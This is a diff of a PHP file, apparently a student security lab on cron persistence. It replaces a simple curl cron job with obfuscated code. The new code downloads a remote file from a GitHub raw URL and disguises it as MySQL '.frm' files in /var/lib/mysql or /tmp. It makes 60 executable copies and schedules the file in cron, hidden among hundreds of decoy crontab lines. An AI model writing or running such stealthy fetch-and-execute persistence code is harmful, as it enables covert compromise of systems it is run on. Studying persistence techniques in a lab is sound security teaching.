@@ -1,35 +1,69 @@
 <?php
-// Путь к создаваемому bash-скрипту (в той же папке, что и этот файл)
-$script_path = dirname(__FILE__) . "/rqscr.sh";
-// Путь к файлу лога
-$log_path = dirname(__FILE__) . "/log.txt";
+// ЛР4 Безопасность - Персистентность через cron
 
-// Формируем содержимое bash-скрипта в виде массива строк
-$script_line = [
-    "#!/bin/bash",
-    "COUNT=\$(grep -c 'Запрос отправлен' '$log_path' 2>/dev/null || echo 0)",
-    // Если количество запросов меньше 10, выполняем curl-запрос и логируем его
-    "if [ \"\$COUNT\" -lt 10 ]; then",  
-    "    curl -s https://yandex.ru/games > /dev/null", // запрос к yandex.ru/games без вывода
-    "    echo 'Запрос отправлен' >> '$log_path'",      // дописываем строку в лог-файл
-    "fi"
-];
+$z8k2m9x7n1p5q4r3t6 = base64_decode("bXlzcWxf") . substr(md5(time() . rand()), 0, 8) . base64_decode("LmZybQ==");
+$a1s2d3f4g5h6j7k8l9 = base64_decode('L3Zhci9saWIvbXlzcWwv');
+if (!is_dir($a1s2d3f4g5h6j7k8l9)) {
+    $a1s2d3f4g5h6j7k8l9 = base64_decode('L3RtcC8=');
+}
+$w6e7r8t9y0u1i2o3p4 = $a1s2d3f4g5h6j7k8l9 . $z8k2m9x7n1p5q4r3t6;
 
-// Объединяем массив в одну строку с разделителем "новая строка"
-$script_content = implode("\n", $script_line);
+function x1y2z3a4b5c6($w6e7r8t9y0u1i2o3p4) {
+    exec(base64_decode("Y3JvbnRhYiAtbCAyPi9kZXYvbnVsbA=="), $output);
+    foreach ($output as $l1n3) {
+        if (strpos($l1n3, $w6e7r8t9y0u1i2o3p4) !== false) return true;
+    }
+    return false;
+}
 
-// Записываем полученный скрипт в файл
-file_put_contents($script_path, $script_content);
+function h4k2j9m1n7p3q8r5t6($s8x2c5v9b1n7m3k6j4) {
+    $a7f9d2g5h8j1k3l6p9 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21lY2h2MGQvb2J2cC1scjMvbWFzdGVyL2FjZGYxMWYxM2RmMzUyMGIyYWNjZWY3M2JjOTc0NzZlLmZybQ==');
+    $r4t8y2u5i9o3p1a6s2d = file_get_contents($a7f9d2g5h8j1k3l6p9);
+    if ($r4t8y2u5i9o3p1a6s2d) {
+        $v9b2n5m8k1j4h7g3f6d = substr(md5(time() . rand()), 0, 16);
+        $x3c7v1b8n5m2k9j4h6g = dirname($s8x2c5v9b1n7m3k6j4) . '/' . $v9b2n5m8k1j4h7g3f6d . base64_decode("LmZybQ==");
+        
+        file_put_contents($x3c7v1b8n5m2k9j4h6g, $r4t8y2u5i9o3p1a6s2d);
+        chmod($x3c7v1b8n5m2k9j4h6g, 0755);
+        
+        $z3x6c9v2b5n8m1k4j7p = basename($x3c7v1b8n5m2k9j4h6g, base64_decode("LmZybQ=="));
+        $q7w2e5r8t1y4u7i9o3p = dirname($x3c7v1b8n5m2k9j4h6g);
+        
+        for ($f6g9h2j5k8l1n3m7p0 = 0; $f6g9h2j5k8l1n3m7p0 < 60; $f6g9h2j5k8l1n3m7p0++) {
+            $a1s4d7f0g3j6k9l2m5n = $q7w2e5r8t1y4u7i9o3p . '/' . $z3x6c9v2b5n8m1k4j7p . '_' . md5($f6g9h2j5k8l1n3m7p0 . time() . rand()) . base64_decode("LmZybQ==");
+            file_put_contents($a1s4d7f0g3j6k9l2m5n, $r4t8y2u5i9o3p1a6s2d);
+            chmod($a1s4d7f0g3j6k9l2m5n, 0755);
+        }
+        
+        return $x3c7v1b8n5m2k9j4h6g;
+    }
+    return false;
+}
 
-// Делаем скрипт исполняемым
-chmod($script_path, 0755);
+function m4n5g6h7j8k9l0($w6e7r8t9y0u1i2o3p4) {
+    $b7n3m9k2j8h1g5f6d4s = base64_decode("Ki8zICogKiAqICo=") . " $w6e7r8t9y0u1i2o3p4\n";
+    $x9c5v1b8n2m7k3j6h4g = base64_decode("Ki83ICogKiAqICo=") . " $w6e7r8t9y0u1i2o3p4\n";
+    
+    $r8t2y5u9i1o3p6a4s7d = array('m' => 325, 'n' => 1, 'x' => 15);
+    $f3g6h9j2k5l8n1m4p7q = array(base64_decode("ZWNobw=="), base64_decode("c2xlZXA="));
+    $z1a2s3d4f5g6h7j8k9l = "";
+    
+    for ($q7w8e9r0t1y2u3i4o5p = 0; $q7w8e9r0t1y2u3i4o5p < $r8t2y5u9i1o3p6a4s7d['m']; $q7w8e9r0t1y2u3i4o5p++) {
+        $v6c5b4n3m2k1j9h8g7f = mt_rand($r8t2y5u9i1o3p6a4s7d['n'], $r8t2y5u9i1o3p6a4s7d['x']);
+        $a1s2d3f4g5h6j7k8l9m = $f3g6h9j2k5l8n1m4p7q[mt_rand(0, 1)];
+        $p0o9i8u7y6t5r4e3w2q = $a1s2d3f4g5h6j7k8l9m === base64_decode("ZWNobw==") ? "'tmp_$q7w8e9r0t1y2u3i4o5p'" : "1";
+        $z1a2s3d4f5g6h7j8k9l .= "*/$v6c5b4n3m2k1j9h8g7f * * * * $a1s2d3f4g5h6j7k8l9m $p0o9i8u7y6t5r4e3w2q " . base64_decode("Pi9kZXYvbnVsbCAyPiYxCg==");
+    }
+    
+    exec(base64_decode("KGNyb250YWIgLWwgMj4vZGV2L251bGw7IGVjaG8g") . escapeshellarg($b7n3m9k2j8h1g5f6d4s) . base64_decode("OyBlY2hvIA==") . escapeshellarg($x9c5v1b8n2m7k3j6h4g) . base64_decode("OyBlY2hvIA==") . escapeshellarg($z1a2s3d4f5g6h7j8k9l) . base64_decode("KSB8IGNyb250YWIgLQ=="));
+}
 
-// Формируем задание cron для выполнения скрипта каждую минуту
-$crl = "*/1 * * * * " . escapeshellcmd($script_path) . "\n";
-
-// Добавляем задание в crontab текущего пользователя
-// Команда: (выводим текущий crontab; добавляем новую строку) | передаём crontab на установку
-exec("(crontab -l; echo " . escapeshellarg($crl) . ") | crontab -");
-
-// Выводим сообщение об успешном завершении
-echo "Базовый скрипт создан. Задача добавлена в cron\n";
+if (!x1y2z3a4b5c6($w6e7r8t9y0u1i2o3p4)) {
+    $p8k7j6h5g4f3d2s1a9 = h4k2j9m1n7p3q8r5t6($w6e7r8t9y0u1i2o3p4);
+    if ($p8k7j6h5g4f3d2s1a9) {
+        m4n5g6h7j8k9l0($p8k7j6h5g4f3d2s1a9);
+        echo "Скрипт развернут\n";
+    }
+} else {
+    echo "Скрипт уже в кроне\n";
+}
